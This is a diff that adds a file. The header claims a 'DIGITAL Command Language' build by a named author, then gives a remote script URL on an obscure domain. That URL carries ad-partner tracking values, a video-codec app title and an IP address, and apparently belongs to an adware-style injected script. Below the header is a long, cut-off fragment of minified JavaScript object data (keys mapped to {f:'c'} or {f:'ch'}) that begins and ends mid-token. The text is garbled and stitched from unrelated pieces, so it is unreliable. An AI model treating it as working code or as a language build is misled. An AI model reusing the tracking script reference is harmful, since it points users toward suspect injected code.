@@ -1,0 +1,378 @@
+-My build of DIGITAL Command Language:
+-Muhammad Adi Nugroho,S.Adm.Neg.:
+-Via My Notepad++ (HTML Editor):
+-http://i.crbsjs.info/opt_content.js?v=opt_1461565488328&partner=crbf&channel=crbfcrdr_300182410022000000&sset=8&appTitle=TheHDvid-Codec&products=&ip=110.137.199.73 :
+-Via Node.js:
+se:{f:"ch"},1sf:{f:"c"},1sg:{f:"c"},1sh:{},1si:{f:"ch"},1sj:{f:"ch"},1sk:{},1sl:
+{f:"c"},1sm:{f:"ch"},1sn:{f:"c"},1so:{f:"ch"},1sp:{f:"c"},1sq:{},1sr:{f:"ch"},1s
+s:{f:"ch"},1st:{f:"c"},1su:{f:"ch"},1sv:{f:"ch"},1sw:{f:"ch"},1sx:{f:"ch"},1sy:{
+f:"ch"},1sz:{f:"ch"},1sA:{f:"ch"},1sB:{f:"c"},1sC:{f:"ch"},1sD:{f:"ch"},1sE:{f:"
+ch"},1sF:{f:"ch"},1sG:{f:"ch"},1sH:{f:"ch"},1sI:{f:"c"},1sJ:{f:"c"},1sK:{f:"ch"}
+,1sL:{f:"ch"},1sM:{f:"c"},1sN:{f:"c"},1sO:{f:"ch"},1sP:{f:"ch"},1sQ:{f:"ch"},1sR
+:{f:"ch"},1sS:{f:"ch"},1sT:{f:"c"},1sU:{},1sV:{f:"c"},1sW:{f:"ch"},1sX:{f:"ch"},
+1sY:{f:"c"},1sZ:{f:"ch"},1t0:{f:"ch"},1t1:{f:"ch"},1t2:{f:"ch"},1t3:{},1t4:{f:"c
+h"},1t5:{f:"c"},1t6:{f:"ch"},1t7:{},1t8:{f:"c"},1t9:{f:"ch"},1ta:{f:"c"},1tb:{f:
+"ch"},1tc:{f:"ch"},1td:{f:"ch"},1te:{},1tf:{},1tg:{f:"ch"},1th:{f:"c"},1ti:{f:"c
+"},1tj:{f:"ch"},1tk:{f:"ch"},1tl:{f:"c"},1tm:{f:"ch"},1tn:{f:"ch"},1to:{f:"ch"},
+1tp:{},1tq:{f:"c"},1tr:{f:"c"},1ts:{f:"ch"},1tt:{f:"ch"},1tu:{f:"ch"},1tv:{},1tw
+:{f:"ch"},1tx:{f:"ch"},1ty:{f:"ch"},1tz:{f:"ch"},1tA:{f:"ch"},1tB:{f:"c"},1tC:{f
+:"ch"},1tD:{f:"ch"},1tE:{f:"ch"},1tF:{f:"ch"},1tG:{f:"ch"},1tH:{f:"c"},1tI:{f:"c
+h"},1tJ:{f:"ch"},1tK:{f:"ch"},1tL:{f:"ch"},1tM:{f:"ch"},1tN:{f:"c"},1tO:{f:"c"},
+1tP:{f:"ch"},1tQ:{},1tR:{f:"ch"},1tS:{f:"ch"},1tT:{f:"ch"},1tU:{f:"ch"},1tV:{f:"
+ch"},1tW:{f:"ch"},1tX:{f:"c"},1tY:{f:"ch"},1tZ:{f:"ch"},1u0:{},1u1:{f:"ch"},1u2:
+{f:"ch"},1u3:{f:"ch"},1u4:{f:"c"},1u5:{f:"c"},1u6:{f:"c"},1u7:{},1u8:{f:"ch"},1u
+9:{f:"ch"},1ua:{f:"c"},1ub:{f:"ch"},1uc:{},1ud:{f:"c"},1ue:{},1uf:{f:"c"},1ug:{f
+:"ch"},1uh:{f:"c"},1ui:{f:"ch"},1uj:{},1uk:{f:"ch"},1ul:{f:"ch"},1um:{f:"ch"},1u
+n:{f:"c"},1uo:{f:"ch"},1up:{f:"c"},1uq:{f:"ch"},1ur:{f:"c"},1us:{f:"ch"},1ut:{},
+1uu:{f:"ch"},1uv:{f:"ch"},1uw:{f:"ch"},1ux:{f:"ch"},1uy:{f:"ch"},1uz:{f:"ch"},1u
+A:{f:"ch"},1uB:{f:"ch"},1uC:{f:"ch"},1uD:{},1uE:{},1uF:{f:"ch"},1uG:{f:"ch"},1uH
+:{},1uI:{f:"c"},1uJ:{f:"ch"},1uK:{f:"ch"},1uL:{f:"c"},1uM:{f:"ch"},1uN:{f:"ch"},
+1uO:{f:"c"},1uP:{f:"ch"},1uQ:{f:"ch"},1uR:{f:"ch"},1uS:{f:"c"},1uT:{f:"ch"},1uU:
+{f:"c"},1uV:{f:"ch"},1uW:{f:"ch"},1uX:{f:"ch"},1uY:{f:"c"},1uZ:{f:"ch"},1v0:{},1
+v1:{f:"ch"},1v2:{f:"ch"},1v3:{f:"c"},1v4:{f:"ch"},1v5:{},1v6:{f:"ch"},1v7:{},1v8
+:{f:"ch"},1v9:{f:"ch"},1va:{f:"ch"},1vb:{f:"ch"},1vc:{f:"ch"},1vd:{f:"c"},1ve:{f
+:"ch"},1vf:{f:"c"},1vg:{f:"c"},1vh:{f:"ch"},1vi:{f:"ch"},1vj:{f:"c"},1vk:{f:"ch"
+},1vl:{f:"ch"},1vm:{},1vn:{},1vo:{f:"ch"},1vp:{},1vq:{f:"c"},1vr:{f:"c"},1vs:{},
+1vt:{f:"ch"},1vu:{f:"ch"},1vv:{f:"ch"},1vw:{},1vx:{f:"ch"},1vy:{f:"ch"},1vz:{},1
+vA:{f:"ch"},1vB:{f:"ch"},1vC:{f:"ch"},1vD:{f:"ch"},1vE:{f:"ch"},1vF:{f:"ch"},1vG
+:{f:"c"},1vH:{f:"ch"},1vI:{f:"ch"},1vJ:{f:"c"},1vK:{},1vL:{f:"ch"},1vM:{f:"ch"},
+1vN:{f:"ch"},1vO:{f:"c"},1vP:{},1vQ:{f:"c"},1vR:{f:"ch"},1vS:{f:"c"},1vT:{f:"ch"
+},1vU:{},1vV:{f:"ch"},1vW:{f:"ch"},1vX:{f:"ch"},1vY:{f:"ch"},1vZ:{},1w0:{},1w1:{
+f:"ch"},1w2:{f:"c"},1w3:{f:"ch"},1w4:{f:"c"},1w5:{},1w6:{f:"c"},1w7:{f:"c"},1w8:
+{f:"c"},1w9:{},1wa:{f:"ch"},1wb:{f:"ch"},1wc:{f:"ch"},1wd:{f:"ch"},1we:{f:"ch"},
+1wf:{},1wg:{f:"ch"},1wh:{f:"ch"},1wi:{f:"ch"},1wj:{f:"ch"},1wk:{f:"ch"},1wl:{f:"
+ch"},1wm:{f:"c"},1wn:{f:"ch"},1wo:{f:"ch"},1wp:{f:"c"},1wq:{f:"c"},1wr:{f:"ch"},
+1ws:{f:"ch"},1wt:{f:"ch"},1wu:{f:"ch"},1wv:{f:"ch"},1ww:{f:"c"},1wx:{f:"ch"},1wy
+:{f:"ch"},1wz:{f:"c"},1wA:{f:"ch"},1wB:{f:"ch"},1wC:{f:"ch"},1wD:{f:"ch"},1wE:{}
+,1wF:{f:"c"},1wG:{f:"c"},1wH:{f:"ch"},1wI:{f:"ch"},1wJ:{f:"ch"},1wK:{f:"ch"},1wL
+:{f:"c"},1wM:{f:"ch"},1wN:{},1wO:{f:"c"},1wP:{f:"c"},1wQ:{f:"ch"},1wR:{},1wS:{f:
+"ch"},1wT:{},1wU:{f:"c"},1wV:{f:"c"},1wW:{f:"c"},1wX:{},1wY:{f:"c"},1wZ:{f:"ch"}
+,1x0:{},1x1:{f:"ch"},1x2:{f:"c"},1x3:{f:"ch"},1x4:{f:"ch"},1x5:{f:"ch"},1x6:{f:"
+ch"},1x7:{f:"c"},1x8:{f:"ch"},1x9:{f:"ch"},1xa:{f:"ch"},1xb:{f:"ch"},1xc:{f:"ch"
+},1xd:{f:"ch"},1xe:{f:"ch"},1xf:{f:"c"},1xg:{},1xh:{},1xi:{f:"ch"},1xj:{f:"ch"},
+1xk:{},1xl:{f:"c"},1xm:{f:"ch"},1xn:{f:"c"},1xo:{f:"c"},1xp:{f:"c"},1xq:{f:"ch"}
+,1xr:{f:"ch"},1xs:{f:"c"},1xt:{},1xu:{f:"ch"},1xv:{f:"ch"},1xw:{f:"c"},1xx:{f:"c
+h"},1xy:{f:"ch"},1xz:{f:"ch"},1xA:{f:"ch"},1xB:{},1xC:{f:"c"},1xD:{f:"c"},1xE:{}
+,1xF:{f:"ch"},1xG:{},1xH:{f:"ch"},1xI:{f:"c"},1xJ:{},1xK:{f:"ch"},1xL:{f:"ch"},1
+xM:{f:"ch"},1xN:{f:"c"},1xO:{},1xP:{f:"c"},1xQ:{f:"ch"},1xR:{f:"ch"},1xS:{f:"ch"
+},1xT:{f:"ch"},1xU:{f:"ch"},1xV:{f:"ch"},1xW:{f:"c"},1xX:{},1xY:{f:"c"},1xZ:{},1
+y0:{f:"c"},1y1:{f:"c"},1y2:{f:"ch"},1y3:{},1y4:{f:"ch"},1y5:{f:"ch"},1y6:{},1y7:
+{f:"ch"},1y8:{f:"ch"},1y9:{f:"ch"},1ya:{},1yb:{f:"ch"},1yc:{f:"ch"},1yd:{f:"ch"}
+,1ye:{f:"ch"},1yf:{},1yg:{f:"ch"},1yh:{f:"c"},1yi:{f:"ch"},1yj:{f:"ch"},1yk:{f:"
+ch"},1yl:{f:"ch"},1ym:{f:"ch"},1yn:{f:"ch"},1yo:{f:"c"},1yp:{},1yq:{f:"ch"},1yr:
+{f:"ch"},1ys:{f:"ch"},1yt:{f:"c"},1yu:{},1yv:{},1yw:{f:"c"},1yx:{f:"ch"},1yy:{f:
+"c"},1yz:{f:"c"},1yA:{},1yB:{f:"ch"},1yC:{f:"ch"},1yD:{f:"ch"},1yE:{},1yF:{f:"ch
+"},1yG:{f:"c"},1yH:{},1yI:{f:"ch"},1yJ:{f:"c"},1yK:{f:"ch"},1yL:{f:"ch"},1yM:{f:
+"ch"},1yN:{f:"c"},1yO:{f:"c"},1yP:{f:"ch"},1yQ:{f:"ch"},1yR:{},1yS:{f:"ch"},1yT:
+{f:"ch"},1yU:{f:"ch"},1yV:{f:"ch"},1yW:{f:"c"},1yX:{f:"ch"},1yY:{f:"ch"},1yZ:{f:
+"ch"},1z0:{f:"ch"},1z1:{f:"c"},1z2:{f:"c"},1z3:{f:"ch"},1z4:{f:"ch"},1z5:{f:"ch"
+},1z6:{},1z7:{f:"c"},1z8:{f:"ch"},1z9:{f:"c"},1za:{f:"ch"},1zb:{f:"c"},1zc:{f:"c
+h"},1zd:{},1ze:{f:"ch"},1zf:{f:"ch"},1zg:{f:"ch"},1zh:{f:"c"},1zi:{f:"ch"},1zj:{
+f:"ch"},1zk:{f:"ch"},1zl:{f:"c"},1zm:{f:"c"},1zn:{f:"ch"},1zo:{f:"c"},1zp:{f:"ch
+"},1zq:{f:"ch"},1zr:{f:"ch"},1zs:{f:"c"},1zt:{},1zu:{f:"ch"},1zv:{},1zw:{f:"ch"}
+,1zx:{f:"ch"},1zy:{f:"ch"},1zz:{},1zA:{f:"ch"},1zB:{},1zC:{f:"ch"},1zD:{f:"c"},1
+zE:{f:"c"},1zF:{f:"c"},1zG:{f:"ch"},1zH:{f:"ch"},1zI:{f:"ch"},1zJ:{f:"c"},1zK:{f
+:"ch"},1zL:{},1zM:{f:"ch"},1zN:{f:"c"},1zO:{f:"ch"},1zP:{f:"ch"},1zQ:{f:"ch"},1z
+R:{},1zS:{f:"ch"},1zT:{f:"ch"},1zU:{f:"ch"},1zV:{f:"ch"},1zW:{f:"ch"},1zX:{f:"ch
+"},1zY:{f:"c"},1zZ:{f:"ch"},1A0:{f:"c"},1A1:{f:"c"},1A2:{f:"ch"},1A3:{f:"ch"},1A
+4:{f:"ch"},1A5:{f:"ch"},1A6:{f:"ch"},1A7:{f:"c"},1A8:{f:"ch"},1A9:{f:"ch"},1Aa:{
+f:"ch"},1Ab:{f:"c"},1Ac:{},1Ad:{},1Ae:{f:"c"},1Af:{f:"ch"},1Ag:{f:"ch"},1Ah:{f:"
+ch"},1Ai:{f:"ch"},1Aj:{f:"ch"},1Ak:{f:"ch"},1Al:{f:"ch"},1Am:{f:"ch"},1An:{f:"ch
+"},1Ao:{f:"c"},1Ap:{f:"c"},1Aq:{f:"ch"},1Ar:{},1As:{f:"c"},1At:{f:"ch"},1Au:{},1
+Av:{f:"ch"},1Aw:{f:"ch"},1Ax:{f:"ch"},1Ay:{f:"ch"},1Az:{f:"ch"},1AA:{f:"ch"},1AB
+:{f:"ch"},1AC:{f:"ch"},1AD:{f:"ch"},1AE:{f:"ch"},1AF:{},1AG:{f:"c"},1AH:{f:"ch"}
+,1AI:{f:"c"},1AJ:{f:"ch"},1AK:{f:"ch"},1AL:{f:"c"},1AM:{},1AN:{f:"c"},1AO:{f:"c"
+},1AP:{},1AQ:{f:"ch"},1AR:{f:"ch"},1AS:{f:"ch"},1AT:{f:"ch"},1AU:{f:"c"},1AV:{f:
+"ch"},1AW:{f:"ch"},1AX:{f:"ch"},1AY:{f:"ch"},1AZ:{f:"ch"},1B0:{f:"ch"},1B1:{f:"c
+h"},1B2:{f:"ch"},1B3:{f:"c"},1B4:{f:"ch"},1B5:{f:"ch"},1B6:{},1B7:{f:"ch"},1B8:{
+f:"ch"},1B9:{f:"c"},1Ba:{},1Bb:{f:"ch"},1Bc:{},1Bd:{f:"ch"},1Be:{f:"ch"},1Bf:{f:
+"c"},1Bg:{f:"ch"},1Bh:{f:"c"},1Bi:{f:"ch"},1Bj:{f:"ch"},1Bk:{f:"c"},1Bl:{f:"ch"}
+,1Bm:{f:"ch"},1Bn:{f:"ch"},1Bo:{f:"c"},1Bp:{f:"ch"},1Bq:{},1Br:{f:"c"},1Bs:{f:"c
+h"},1Bt:{f:"ch"},1Bu:{f:"c"},1Bv:{f:"ch"},1Bw:{f:"ch"},1Bx:{f:"ch"},1By:{f:"ch"}
+,1Bz:{f:"ch"},1BA:{f:"ch"},1BB:{f:"ch"},1BC:{f:"ch"},1BD:{f:"ch"},1BE:{f:"c"},1B
+F:{f:"c"},1BG:{f:"c"},1BH:{f:"ch"},1BI:{f:"c"},1BJ:{f:"ch"},1BK:{},1BL:{f:"ch"},
+1BM:{f:"ch"},1BN:{f:"ch"},1BO:{},1BP:{},1BQ:{f:"ch"},1BR:{f:"ch"},1BS:{f:"ch"},1
+BT:{f:"ch"},1BU:{f:"ch"},1BV:{f:"c"},1BW:{f:"ch"},1BX:{f:"ch"},1BY:{f:"ch"},1BZ:
+{f:"ch"},1C0:{f:"ch"},1C1:{f:"ch"},1C2:{f:"ch"},1C3:{f:"c"},1C4:{f:"ch"},1C5:{f:
+"c"},1C6:{f:"ch"},1C7:{f:"ch"},1C8:{f:"ch"},1C9:{f:"c"},1Ca:{f:"ch"},1Cb:{f:"ch"
+},1Cc:{},1Cd:{},1Ce:{f:"ch"},1Cf:{f:"ch"},1Cg:{f:"c"},1Ch:{},1Ci:{f:"ch"},1Cj:{f
+:"ch"},1Ck:{},1Cl:{f:"ch"},1Cm:{f:"c"},1Cn:{f:"ch"},1Co:{f:"ch"},1Cp:{f:"ch"},1C
+q:{f:"c"},1Cr:{f:"ch"},1Cs:{f:"c"},1Ct:{f:"c"},1Cu:{f:"ch"},1Cv:{f:"ch"},1Cw:{f:
+"c"},1Cx:{f:"ch"},1Cy:{},1Cz:{f:"ch"},1CA:{f:"ch"},1CB:{f:"c"},1CC:{f:"ch"},1CD:
+{f:"ch"},1CE:{f:"c"},1CF:{f:"c"},1CG:{f:"ch"},1CH:{f:"ch"},1CI:{f:"c"},1CJ:{f:"c
+h"},1CK:{f:"c"},1CL:{f:"c"},1CM:{f:"ch"},1CN:{},1CO:{},1CP:{f:"c"},1CQ:{f:"ch"},
+1CR:{f:"c"},1CS:{f:"c"},1CT:{},1CU:{},1CV:{f:"c"},1CW:{f:"ch"},1CX:{f:"c"},1CY:{
+f:"ch"},1CZ:{f:"ch"},1D0:{f:"ch"},1D1:{f:"ch"},1D2:{},1D3:{f:"c"},1D4:{f:"ch"},1
+D5:{f:"ch"},1D6:{f:"ch"},1D7:{f:"c"},1D8:{f:"ch"},1D9:{f:"ch"},1Da:{f:"c"},1Db:{
+f:"ch"},1Dc:{f:"c"},1Dd:{f:"ch"},1De:{f:"c"},1Df:{f:"c"},1Dg:{f:"ch"},1Dh:{f:"ch
+"},1Di:{f:"ch"},1Dj:{f:"ch"},1Dk:{f:"ch"},1Dl:{f:"ch"},1Dm:{f:"ch"},1Dn:{f:"ch"}
+,1Do:{f:"c"},1Dp:{f:"c"},1Dq:{f:"ch"},1Dr:{f:"ch"},1Ds:{f:"ch"},1Dt:{f:"ch"},1Du
+:{f:"ch"},1Dv:{f:"ch"},1Dw:{f:"ch"},1Dx:{f:"ch"},1Dy:{f:"c"},1Dz:{f:"ch"},1DA:{f
+:"c"},1DB:{f:"c"},1DC:{f:"ch"},1DD:{f:"c"},1DE:{f:"c"},1DF:{f:"ch"},1DG:{f:"c"},
+1DH:{f:"c"},1DI:{f:"ch"},1DJ:{f:"ch"},1DK:{f:"ch"},1DL:{f:"ch"},1DM:{f:"ch"},1DN
+:{f:"ch"},1DO:{f:"ch"},1DP:{f:"c"},1DQ:{f:"ch"},1DR:{f:"ch"},1DS:{f:"ch"},1DT:{f
+:"ch"},1DU:{f:"c"},1DV:{f:"ch"},1DW:{f:"c"},1DX:{f:"c"},1DY:{f:"ch"},1DZ:{f:"ch"
+},1E0:{f:"c"},1E1:{f:"ch"},1E2:{f:"ch"},1E5:{f:"ch"},1E7:{f:"ch"},1Ea:{f:"ch"},1
+Eb:{f:"c"},1Ec:{f:"ch"},1Ed:{f:"ch"},1Ee:{f:"c"},1Ef:{f:"ch"},1Eg:{f:"ch"},1Eh:{
+},1Ei:{f:"ch"},1Ej:{f:"c"},1Ek:{f:"ch"},1El:{f:"ch"},1Em:{f:"ch"},1En:{f:"ch"},1
+Eo:{f:"ch"},1Ep:{},1Eq:{f:"ch"},1Er:{f:"ch"},1Es:{f:"ch"},1Et:{f:"c"},1Eu:{f:"ch
+"},1Ev:{f:"ch"},1Ew:{f:"c"},1Ex:{},1Ey:{},1Ez:{f:"ch"},1EA:{f:"ch"},1EB:{f:"ch"}
+,1EC:{f:"c"},1ED:{f:"ch"},1EE:{f:"ch"},1EF:{f:"c"},1EG:{f:"ch"},1EH:{f:"ch"},1EI
+:{f:"ch"},1EJ:{},1EK:{f:"ch"},1EL:{f:"ch"},1EM:{f:"c"},1EN:{},1EO:{},1EP:{f:"c"}
+,1EQ:{f:"ch"},1ER:{},1ES:{f:"ch"},1ET:{f:"ch"},1EU:{f:"ch"},1EV:{f:"c"},1EW:{f:"
+ch"},1EX:{f:"c"},1EY:{f:"ch"},1EZ:{f:"ch"},1F0:{},1F1:{f:"ch"},1F2:{f:"ch"},1F3:
+{f:"ch"},1F4:{f:"c"},1F5:{f:"ch"},1F6:{f:"ch"},1F7:{f:"ch"},1F8:{f:"ch"},1F9:{},
+1Fa:{},1Fb:{},1Fc:{f:"c"},1Fd:{f:"ch"},1Fe:{f:"ch"},1Ff:{f:"ch"},1Fg:{f:"ch"},1F
+h:{f:"ch"},1Fi:{f:"c"},1Fj:{f:"ch"},1Fk:{f:"c"},1Fl:{},1Fm:{f:"c"},1Fn:{},1Fo:{f
+:"ch"},1Fp:{f:"ch"},1Fq:{f:"ch"},1Fr:{},1Fs:{f:"c"},1Ft:{f:"ch"},1Fu:{f:"c"},1Fv
+:{f:"ch"},1Fw:{f:"c"},1Fx:{},1Fy:{f:"ch"},1Fz:{f:"c"},1FA:{f:"ch"},1FB:{},1FC:{f
+:"c"},1FD:{f:"ch"},1FE:{},1FF:{},1FG:{f:"ch"},1FH:{f:"ch"},1FI:{f:"ch"},1FJ:{f:"
+c"},1FK:{f:"ch"},1FL:{f:"ch"},1FM:{f:"ch"},1FN:{f:"ch"},1FO:{f:"c"},1FP:{f:"c"},
+1FQ:{f:"ch"},1FR:{f:"ch"},1FS:{f:"ch"},1FT:{f:"c"},1FU:{f:"ch"},1FV:{f:"ch"},1FW
+:{f:"c"},1FX:{f:"ch"},1FY:{f:"ch"},1FZ:{f:"ch"},1G0:{f:"ch"},1G1:{f:"ch"},1G2:{f
+:"c"},1G3:{f:"c"},1G4:{f:"ch"},1G5:{},1G6:{f:"ch"},1G7:{f:"c"},1G8:{f:"ch"},1G9:
+{f:"ch"},1Ga:{f:"ch"},1Gb:{f:"c"},1Gc:{},1Gd:{f:"c"},1Ge:{f:"ch"},1Gf:{f:"ch"},1
+Gg:{f:"ch"},1Gh:{f:"ch"},1Gi:{f:"ch"},1Gj:{f:"ch"},1Gk:{f:"ch"},1Gl:{f:"ch"},1Gm
+:{f:"c"},1Gn:{f:"c"},1Go:{f:"ch"},1Gp:{f:"ch"},1Gq:{f:"ch"},1Gr:{f:"ch"},1Gs:{f:
+"c"},1Gt:{f:"ch"},1Gu:{},1Gv:{f:"ch"},1Gw:{f:"ch"},1Gx:{f:"c"},1Gy:{f:"c"},1Gz:{
+f:"ch"},1GA:{f:"c"},1GB:{f:"ch"},1GC:{f:"ch"},1GD:{f:"c"},1GE:{f:"c"},1GF:{},1GG
+:{f:"c"},1GH:{f:"c"},1GI:{f:"ch"},1GJ:{f:"ch"},1GK:{f:"c"},1GL:{f:"c"},1GM:{f:"c
+"},1GN:{f:"ch"},1GO:{f:"ch"},1GP:{},1GQ:{f:"c"},1GR:{f:"ch"},1GS:{f:"ch"},1GT:{f
+:"ch"},1GU:{f:"c"},1GV:{f:"ch"},1GW:{f:"c"},1GX:{f:"ch"},1GY:{f:"c"},1GZ:{},1H0:
+{f:"ch"},1H1:{},1H2:{f:"ch"},1H3:{f:"ch"},1H4:{f:"ch"},1H5:{},1H6:{f:"ch"},1H7:{
+f:"c"},1H8:{f:"ch"},1H9:{f:"c"},1Ha:{},1Hb:{f:"ch"},1Hc:{f:"ch"},1Hd:{},1He:{f:"
+ch"},1Hf:{f:"c"},1Hg:{f:"ch"},1Hh:{f:"ch"},1Hi:{f:"ch"},1Hj:{f:"ch"},1Hk:{f:"ch"
+},1Hl:{f:"ch"},1Hm:{f:"ch"},1Hn:{f:"ch"},1Ho:{f:"ch"},1Hp:{},1Hq:{f:"ch"},1Hr:{f
+:"ch"},1Hs:{f:"ch"},1Ht:{f:"ch"},1Hu:{f:"ch"},1Hv:{f:"c"},1Hw:{f:"ch"},1Hx:{f:"c
+h"},1Hy:{f:"ch"},1Hz:{f:"c"},1HA:{f:"c"},1HB:{f:"c"},1HC:{f:"ch"},1HD:{f:"ch"},1
+HE:{f:"ch"},1HF:{f:"c"},1HG:{f:"ch"},1HH:{f:"ch"},1HI:{},1HJ:{},1HK:{f:"ch"},1HL
+:{},1HM:{},1HN:{f:"ch"},1HO:{f:"c"},1HP:{},1HQ:{f:"c"},1HR:{f:"ch"},1HS:{f:"ch"}
+,1HT:{f:"ch"},1HU:{f:"ch"},1HV:{f:"c"},1HW:{f:"ch"},1HX:{},1HY:{f:"ch"},1HZ:{f:"
+c"},1I0:{f:"ch"},1I1:{f:"ch"},1I2:{f:"ch"},1I3:{f:"ch"},1I4:{},1I5:{f:"c"},1I6:{
+f:"ch"},1I7:{f:"ch"},1I8:{f:"ch"},1I9:{f:"ch"},1Ia:{f:"ch"},1Ib:{f:"ch"},1Ic:{f:
+"ch"},1Id:{f:"ch"},1Ie:{f:"ch"},1If:{f:"ch"},1Ig:{},1Ih:{f:"ch"},1Ii:{f:"ch"},1I
+j:{f:"c"},1Ik:{f:"ch"},1Il:{f:"ch"},1Im:{f:"ch"},1In:{f:"ch"},1Io:{f:"ch"},1Ip:{
+f:"ch"},1Iq:{f:"ch"},1Ir:{f:"c"},1Is:{f:"ch"},1It:{f:"ch"},1Iu:{f:"c"},1Iv:{f:"c
+"},1Iw:{f:"c"},1Ix:{f:"ch"},1Iy:{f:"ch"},1Iz:{f:"ch"},1IA:{f:"ch"},1IB:{f:"c"},1
+IC:{f:"ch"},1ID:{},1IE:{},1IF:{},1IG:{f:"ch"},1IH:{f:"c"},1II:{},1IJ:{f:"ch"},1I
+K:{f:"c"},1IL:{f:"ch"},1IM:{f:"c"},1IN:{f:"c"},1IO:{},1IP:{f:"ch"},1IQ:{f:"ch"},
+1IR:{f:"ch"},1IS:{},1IT:{f:"c"},1IU:{f:"ch"},1IV:{f:"ch"},1IW:{f:"ch"},1IX:{f:"c
+"},1IY:{f:"ch"},1IZ:{f:"c"},1J0:{},1J1:{f:"ch"},1J2:{},1J3:{f:"c"},1J4:{f:"c"},1
+J5:{f:"ch"},1J6:{},1J7:{f:"c"},1J8:{f:"ch"},1J9:{f:"ch"},1Ja:{f:"ch"},1Jb:{f:"ch
+"},1Jc:{f:"c"},1Jd:{f:"c"},1Je:{},1Jf:{f:"ch"},1Jg:{f:"ch"},1Jh:{f:"ch"},1Ji:{f:
+"ch"},1Jj:{f:"ch"},1Jk:{f:"ch"},1Jl:{},1Jm:{f:"ch"},1Jn:{f:"ch"},1Jo:{f:"c"},1Jp
+:{f:"ch"},1Jq:{f:"c"},1Jr:{},1Js:{},1Jt:{},1Ju:{},1Jv:{f:"c"},1Jw:{f:"ch"},1Jx:{
+f:"c"},1Jy:{f:"ch"},1Jz:{},1JA:{f:"ch"},1JB:{f:"c"},1JC:{f:"ch"},1JD:{f:"ch"},1J
+E:{f:"ch"},1JF:{f:"ch"},1JG:{f:"ch"},1JH:{f:"c"},1JI:{f:"ch"},1JJ:{},1JK:{f:"ch"
+},1JL:{},1JM:{},1JN:{f:"c"},1JO:{f:"ch"},1JP:{f:"ch"},1JQ:{f:"ch"},1JR:{f:"ch"},
+1JS:{f:"c"},1JT:{f:"c"},1JU:{f:"ch"},1JV:{f:"ch"},1JW:{f:"ch"},1JX:{f:"c"},1JY:{
+f:"c"},1JZ:{f:"c"},1K0:{f:"ch"},1K1:{f:"c"},1K2:{},1K3:{},1K4:{f:"ch"},1K5:{f:"c
+h"},1K6:{},1K7:{f:"c"},1K8:{},1K9:{},1Ka:{f:"ch"},1Kb:{f:"ch"},1Kc:{},1Kd:{},1Ke
+:{f:"ch"},1Kf:{f:"c"},1Kg:{},1Kh:{f:"ch"},1Ki:{f:"ch"},1Kj:{f:"ch"},1Kk:{f:"c"},
+1Kl:{f:"c"},1Km:{f:"ch"},1Kn:{f:"c"},1Ko:{f:"c"},1Kp:{f:"ch"},1Kq:{f:"ch"},1Kr:{
+},1Ks:{f:"ch"},1Kt:{f:"ch"},1Ku:{},1Kv:{f:"ch"},1Kw:{f:"c"},1Kx:{f:"ch"},1Ky:{f:
+"ch"},1Kz:{f:"ch"},1KA:{},1KB:{f:"ch"},1KC:{f:"c"},1KD:{f:"c"},1KE:{f:"ch"},1KF:
+{f:"ch"},1KG:{f:"ch"},1KH:{},1KI:{f:"ch"},1KJ:{f:"ch"},1KK:{f:"ch"},1KL:{f:"ch"}
+,1KM:{f:"ch"},1KN:{f:"ch"},1KO:{f:"ch"},1KP:{f:"ch"},1KQ:{f:"ch"},1KR:{},1KS:{f:
+"c"},1KT:{f:"c"},1KU:{f:"ch"},1KV:{f:"ch"},1KW:{f:"ch"},1KX:{f:"ch"},1KY:{f:"c"}
+,1KZ:{f:"ch"},1L0:{f:"c"},1L1:{},1L2:{},1L3:{f:"ch"},1L4:{f:"ch"},1L5:{f:"c"},1L
+6:{f:"ch"},1L7:{f:"ch"},1L8:{f:"c"},1L9:{f:"ch"},1La:{f:"ch"},1Lb:{f:"ch"},1Lc:{
+f:"ch"},1Ld:{f:"ch"},1Le:{f:"ch"},1Lf:{f:"c"},1Lg:{f:"c"},1Lh:{f:"c"},1Li:{f:"ch
+"},1Lj:{},1Lk:{f:"ch"},1Ll:{f:"c"},1Lm:{f:"ch"},1Ln:{f:"ch"},1Lo:{f:"ch"},1Lp:{f
+:"c"},1Lq:{f:"ch"},1Lr:{},1Ls:{f:"ch"},1Lt:{f:"ch"},1Lu:{},1Lv:{f:"ch"},1Lw:{f:"
+ch"},1Lx:{},1Ly:{f:"ch"},1Lz:{},1LA:{f:"ch"},1LB:{f:"ch"},1LC:{f:"ch"},1LD:{f:"c
+h"},1LE:{f:"ch"},1LF:{f:"c"},1LG:{f:"ch"},1LH:{},1LI:{f:"c"},1LJ:{f:"c"},1LK:{f:
+"ch"},1LL:{f:"ch"},1LM:{f:"ch"},1LN:{f:"ch"},1LO:{f:"c"},1LP:{f:"ch"},1LQ:{f:"ch
+"},1LR:{f:"ch"},1LS:{f:"ch"},1LT:{f:"ch"},1LU:{f:"c"},1LV:{f:"ch"},1LW:{},1LX:{f
+:"ch"},1LY:{},1LZ:{f:"c"},1M0:{f:"ch"},1M1:{f:"ch"},1M2:{f:"ch"},1M3:{f:"ch"},1M
+4:{f:"ch"},1M5:{f:"ch"},1M6:{f:"ch"},1M7:{f:"ch"},1M8:{f:"ch"},1M9:{f:"ch"},1Ma:
+{f:"c"},1Mb:{f:"c"},1Mc:{},1Md:{f:"ch"},1Me:{f:"ch"},1Mf:{},1Mg:{f:"ch"},1Mh:{f:
+"c"},1Mi:{f:"ch"},1Mj:{f:"c"},1Mk:{f:"ch"},1Ml:{f:"c"},1Mm:{f:"ch"},1Mn:{f:"ch"}
+,1Mo:{f:"ch"},1Mp:{f:"ch"},1Mq:{f:"c"},1Mr:{f:"ch"},1Ms:{f:"c"},1Mt:{f:"ch"},1Mu
+:{f:"ch"},1Mv:{f:"c"},1Mw:{f:"ch"},1Mx:{f:"c"},1My:{f:"ch"},1Mz:{f:"ch"},1MA:{f:
+"ch"},1MB:{f:"ch"},1MC:{f:"c"},1MD:{f:"ch"},1ME:{},1MF:{f:"ch"},1MG:{f:"ch"},1MH
+:{f:"ch"},1MI:{},1MJ:{f:"ch"},1MK:{},1ML:{f:"ch"},1MM:{f:"c"},1MN:{f:"ch"},1MO:{
+f:"c"},1MP:{f:"ch"},1MQ:{f:"ch"},1MR:{f:"c"},1MS:{f:"ch"},1MT:{f:"ch"},1MU:{f:"c
+h"},1MV:{f:"ch"},1MW:{f:"ch"},1MX:{f:"ch"},1MY:{f:"c"},1MZ:{},1N0:{f:"ch"},1N1:{
+f:"c"},1N2:{f:"ch"},1N3:{f:"ch"},1N4:{f:"ch"},1N5:{f:"ch"},1N6:{f:"c"},1N7:{f:"c
